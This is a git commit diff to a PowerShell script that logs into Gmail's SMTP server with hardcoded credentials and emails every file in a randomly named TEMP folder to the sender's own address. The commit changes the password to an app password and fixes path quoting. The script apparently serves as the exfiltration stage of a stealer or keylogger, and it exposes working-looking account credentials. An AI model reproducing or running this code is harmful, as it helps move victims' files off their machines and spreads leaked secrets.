d6a7f6907d43a2ff22bda0df40ab7ddb47d024fe
sygwtopshvpkrmpfuupy <149439027+sygwtopshvpkrmpfuupy@users.noreply.github.com>
2023-12-21 16:20:42 -0300

    Update alxkdiepw.ps1

--- alxkdiepw.ps1
+++ alxkdiepw.ps1
@@ -1,7 +1,7 @@
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('enjuloverr@gmail.com', 'Pacific@1337');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('enjuloverr@gmail.com', 'ozlr uumd rfkk znfm');
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = 'enjuloverr@gmail.com'
 $ReportEmail.To.Add('enjuloverr@gmail.com')
@@ -11,7 +11,7 @@ $files=Get-ChildItem "$env:TEMP\kzldj"
 Foreach($file in $files)
 {
 Write-Host “Attaching File :- ” $file
-$attachment = New-Object System.Net.Mail.Attachment –ArgumentList $env:TEMP\kzldj\$file
+$attachment = New-Object System.Net.Mail.Attachment –ArgumentList "$env:TEMP\kzldj\$file"
 $ReportEmail.Attachments.Add($attachment)
 $SMTPInfo.Send($ReportEmail)
 }
